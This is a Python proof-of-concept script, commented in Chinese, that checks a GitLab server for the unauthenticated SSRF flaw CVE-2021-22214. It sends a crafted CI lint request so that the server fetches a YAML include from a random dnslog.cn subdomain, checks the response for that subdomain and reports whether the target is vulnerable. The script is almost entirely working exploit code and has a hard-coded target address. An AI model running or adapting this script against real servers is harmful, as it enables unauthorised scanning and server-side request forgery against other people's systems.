# cve-2021-22214 gitlab  ssrf 漏洞  poc
import requests
import json
import re
import urllib3
import random 
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 随机生名
ran_char = ''.join(random.choices(string.ascii_letters + string.digits, k=6)) 

def poc(url):
    urls = url + "/api/v4/ci/lint"
    headers = {
    "Content-Type":"application/json"
    }
    data = {
    "include_merged_yaml":"true",
    "content":f"include:\n  remote: http://{ran_char}.dnslog.cn/api/v1/targets/?test.yml"
    }
    resp = requests.post(url=urls,headers=headers,data=json.dumps(data),verify=False)
    if resp.status_code == 200 and re.search(f"{ran_char}",resp.text):
        return "存在cve-2021-22214 gitlab ssrf 未授权漏洞"
    else :
        return "不存在漏洞"
url  = "http://11.22.33.101:55025"
res = poc(url)
print(res)